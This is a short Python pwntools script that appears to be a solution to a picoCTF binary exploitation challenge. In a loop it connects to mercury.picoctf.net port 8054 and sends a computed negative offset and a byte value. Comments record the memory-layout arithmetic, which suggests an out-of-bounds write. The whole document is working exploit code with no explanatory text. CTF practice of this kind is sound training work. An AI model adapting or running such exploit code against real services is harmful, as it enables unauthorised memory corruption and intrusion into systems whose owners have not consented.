#!/usr/bin/python3

from pwn import *
import sys

start = -5280
off = start + 0x88

# dest = 0x14a0
# dest + prefix(0x18) = 0x14b8
# block = 0x1530
# will print 0x1540

while True:
    r = remote('mercury.picoctf.net', 8054)
    r.sendline(f"{off+1} 4") # '4' == 0x34
    a = r.recvall(timeout=2)
    print(a)

r.interactive()
